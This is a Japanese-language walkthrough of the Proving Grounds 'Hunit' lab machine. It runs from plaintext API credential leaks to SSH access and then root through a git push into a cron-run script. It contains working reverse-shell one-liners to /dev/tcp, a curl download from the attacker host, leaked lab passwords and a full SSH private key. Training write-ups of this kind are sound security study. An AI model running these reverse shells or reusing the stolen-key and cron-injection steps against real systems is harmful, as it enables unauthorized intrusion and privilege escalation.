+++
title = "Proving Grounds Practice - Hunit Writeup"
date = "2026-11-13"
description = "Apache Tomcatで稼働するAPIエンドポイントからクレデンシャルを窃取してSSHで初期アクセスを獲得し、gitユーザーのSSH秘密鍵を奪取、git-serverリポジトリへの不正コミット(cronジョブ経由のコマンドインジェクション)によりroot権限を獲得"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[API Credential Leak]", "[dirsearch]", "[Git Cron Privilege Escalation]", "[Intermediate]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Hunit |
| OS | Linux |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -p- 192.168.136.125
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-12 22:42 +0900
Nmap scan report for 192.168.136.125
Host is up (0.093s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
8080/tcp  open  http        Apache Tomcat (language: en)
|_http-title: My Haikus
|_http-open-proxy: Proxy might be redirecting requests
12445/tcp open  netbios-ssn Samba smbd 4
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Whack A Mole!
|_http-server-header: Apache/2.4.46 (Unix)
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.70 seconds
```

8080番ポートでApache Tomcat(「My Haikus」というタイトルのWebアプリ)、12445番でSamba、18030番でApache httpd(「Whack A Mole!」)、43022番でSSHが稼働していることを確認。

### Directory Enumeration

```bash
dirsearch -u 192.168.136.125:8080
```

```text
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Target: http://192.168.136.125:8080/

[23:21:37] Starting:                                                                                               
[23:21:47] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[23:21:48] 400 -  435B  - /a%5c.aspx                                        
[23:21:58] 200 -  148B  - /api/        
```

`/api/` ディレクトリの存在を確認。また、`/article/the-taste-of-rain` ページのソースにもAPIへの手がかりが見つかった。

```text
http://192.168.136.125:8080/article/the-taste-of-rain

<a href="http://localhost:8080/api/">List all</a>

ソース経由でもapiのdirectoryが見つかる
```

---

## Exploitation

### Credential Leak

`/api/` にアクセスし、エンドポイント一覧を取得。

```text
http://localhost:8080/api/
0	
string	"/api/"
id	13
1	
string	"/article/"
id	14
2	
string	"/article/?"
id	15
3	
string	"/user/"
id	16
4	
string	"/user/?"
id	17
```

`/api/user/` エンドポイントにアクセスすると、ユーザー名とパスワードの平文がそのまま返ってくるクレデンシャル漏洩を確認。

```text
http://192.168.136.125:8080/api/user/

0	
login	"rjackson"
password	"yYJcgYqszv4aGQ"
firstname	"Richard"
lastname	"Jackson"
description	"Editor"
id	1
1	
login	"jsanchez"
password	"d52cQ1BzyNQycg"
firstname	"Jennifer"
lastname	"Sanchez"
description	"Editor"
id	3
2	
login	"dademola"
password	"ExplainSlowQuest110"
firstname	"Derik"
lastname	"Ademola"
description	"Admin"
id	6
3	
login	"jwinters"
password	"KTuGcSW6Zxwd0Q"
firstname	"Julie"
lastname	"Winters"
description	"Editor"
id	7
4	
login	"jvargas"
password	"OuQ96hcgiM5o9w"
firstname	"James"
lastname	"Vargas"
description	"Editor"
id	10
```

`description` が `"Admin"` となっている `dademola` のクレデンシャルを使い、SSH(43022番ポート)へのログインを試みる。

### SSH

```bash
ssh dademola@192.168.136.125 -p 43022
```

```text
[dademola@hunit ~]$ ls
blog.jar  local.txt  shared

[dademola@hunit ~]$ cat local.txt
2f151fce34132dfc21373f215a3ee114
```

初期アクセスに成功し、local.txtのフラグを取得。

---

## Privilege Escalation

### LinPEAS

攻撃者側でHTTPサーバーを起動し、ターゲット側からlinpeas.shを取得。

```bash
python3 -m http.server 12445
```

```text
Serving HTTP on 0.0.0.0 port 12445 (http://0.0.0.0:12445/) ...
92.168.136.125 - - [13/Nov/2026 00:51:39] "GET /linpeas.sh HTTP/1.1" 200 -
```

```bash
curl http://192.168.45.236:12445/linpeas.sh -o linpeas.sh
```

LinPEASの出力から、`/var/spool/anacron` 配下にcronの実行履歴が残っていることを確認。

```text
/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Nov 12 14:29 cron.daily
-rw------- 1 root root    9 Nov 12 15:09 cron.monthly
-rw------- 1 root root    9 Nov 12 14:49 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

rootによって `/root/git-server/backups.sh` と `/root/pull.sh` が定期的に実行されていることが判明。

### Git Server Enumeration

`/` 直下に `git-server` が存在し、`file://` 経由でクローン可能だった。

```bash
git clone file:///git-server/
```

```text
Cloning into 'git-server'...
```

```bash
cd git-server
git log
```

```text
[dademola@hunit git-server]$ ls
NEW_CHANGE  README  backups.sh
[dademola@hunit git-server]$ git log
commit b50f4e5415cae0b650836b5466cc47c62faf7341 (HEAD -> master, origin/master, origin/HEAD)
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 21:05:58 2020 -0300

    testing

commit c71132590f969b535b315089f83f39e48d0021e2
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:59:48 2020 -0300

    testing

commit 8c0bc9aa81756b34cccdd3ce4ac65091668be77b
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:54:50 2020 -0300

    testing

commit 574eba09bb7cc54628f574a694a57cbbd02befa0
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:39:14 2020 -0300

    Adding backups

commit 025a327a0ffc9fe24e6dd312e09dcf5066a011b5
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:23:04 2020 -0300
```

`backups.sh` にリバースシェルのコマンドを追記する方針を試みる。

```bash
echo "bash -c 'bash -i >& /dev/tcp/192.168.45.236./8080 0>&1'" > backups.sh
```

しかし `dademola` ユーザーの権限では `/git-server` 自体の所有者が `git` ユーザーであるため、直接の `git push` は拒否される。そこで、LinPEASの結果から `git` ユーザーのSSH秘密鍵を探索する。

```text
╔══════════╣ Searching ssl/ssh files (T1552.004,T1021.004)
╔══════════╣ Analyzing SSH Files (limit 70)                                                                        
                                                                                                                   
-rwxr-xr-x 1 root root 2590 Nov  5  2020 /home/git/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
qMb6iia+pJ6DLLAAAACnJvb3RAaHVuaXQ=
-----END OPENSSH PRIVATE KEY-----
-rwxr-xr-x 1 root root 564 Nov  5  2020 /home/git/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit

-rw-r--r-- 1 root root 564 Nov  5  2020 /home/git/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit

-rw-r--r-- 1 root root 600 Nov  5  2020 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 172 Nov  5  2020 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 92 Nov  5  2020 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 564 Nov  5  2020 /etc/ssh/ssh_host_rsa_key.pub
-rwxr-xr-x 1 root root 564 Nov  5  2020 /home/git/.ssh/id_rsa.pub

Port 43022
PermitRootLogin yes
AuthorizedKeysFile      .ssh/authorized_keys
ChallengeResponseAuthentication no
UsePAM yes
```

`id_rsa.pub` と `authorized_keys` の内容が一致しており、この秘密鍵で `git` ユーザーとしてSSHログインできることを確認。

### Git User SSH

```bash
ssh -i id_rsa git@192.168.136.125 -p 43022
```

攻撃用マシンへ鍵を持ち出し、`git` ユーザーとして `/git-server` をクローン。

```bash
GIT_SSH_COMMAND='ssh -i id_rsa -o IdentitiesOnly=yes -p 43022' git clone git@192.168.136.125:/git-server
```

```text
┌──(kali㉿kali)-[~]
└─$ GIT_SSH_COMMAND='ssh -i id_rsa -o IdentitiesOnly=yes -p 43022' git clone git@192.168.136.125:/git-server
Cloning into 'git-server'...
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

### Reverse Shell via Git Push

Git識別情報を設定。

```bash
git config --global user.name "kali"
git config --global user.email "kali@kali.local"
```

```text
┌──(kali㉿kali)-[~/git-server]
└─$ git status
On branch master
Your branch is up to date with 'origin/master'.

nothing to commit, working tree clean
```

`backups.sh` の内容を確認し、リバースシェルのペイロードを追記。

```bash
git show origin/master:backups.sh
git ls-tree -l origin/master
```

```text
#!/bin/bash
#
#
# # Placeholder
#
100644 blob e69de29bb2d1d6434b8b29ae775ad8c2e48c5391       0    NEW_CHANGE
100644 blob 7db7445c7213cdc1118359956bdbb144410ea0b2      63    README
100644 blob 5a959db874e0174aa93a1f7eecaf55a5d95f6e11      34    backups.sh
```

```bash
echo "sh -i >& /dev/tcp/192.168.45.236/8080 0>&1" >> backups.sh
chmod +x backups.sh
cat backups.sh
```

```text
#!/bin/bash
#
#
# # Placeholder
#
sh -i >& /dev/tcp/192.168.45.236/8080 0>&1
```

変更をコミットし、`git` ユーザーの権限で `master` ブランチへプッシュ(gitユーザーの所有権限のため、このプッシュは通る)。

```bash
git add -A
git commit -m "pwn"
```

```text
[master f659a64] pwn
 1 file changed, 0 insertions(+), 0 deletions(-)
 mode change 100644 => 100755 backups.sh
```

```bash
GIT_SSH_COMMAND='ssh -i ~/id_rsa -p 43022' git push origin master
```

```text
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enumerating objects: 7, done.
Counting objects: 100% (7/7), done.
Delta compression using up to 6 threads
Compressing objects: 100% (5/5), done.
Writing objects: 100% (5/5), 528 bytes | 528.00 KiB/s, done.
Total 5 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
To 192.168.136.125:/git-server
   b50f4e5..f659a64  master -> master
```

プッシュ後、攻撃者側でリスナーを起動して待機。

```bash
nc -lvnp 8080
```

`*/2 * * * * /root/pull.sh` によって変更がpullされ、`*/3 * * * * /root/git-server/backups.sh` によりroot権限でペイロードが実行される。

```text
listening on [any] 8080 ...
connect to [192.168.45.236] from (UNKNOWN) [192.168.136.125] 51562
sh: cannot set terminal process group (895): Inappropriate ioctl for device
sh: no job control in this shell

sh-5.0# cat proof.txt
cat proof.txt
4bc8b0ba94e8bc36ba9f8ca9c9546565
```

root権限のシェルを獲得し、proof.txtのフラグを取得。

---

## Summary

Apache Tomcat上のWebアプリ(`My Haikus`)が持つ `/api/user/` エンドポイントから平文のユーザー名・パスワードが漏洩しており、Admin権限を持つ`dademola`のクレデンシャルでSSH初期アクセスを獲得。LinPEASによる列挙でrootのcronジョブ(`/root/git-server/backups.sh`、`/root/pull.sh`)の存在と、`git`ユーザーの秘密鍵が`authorized_keys`と同一であることを発見。秘密鍵を奪取して`git`ユーザーとしてリポジトリにリバースシェルのペイロードをpushし、root権限で定期実行されるcronジョブ経由でコマンドが実行され、root権限のシェルを獲得した。
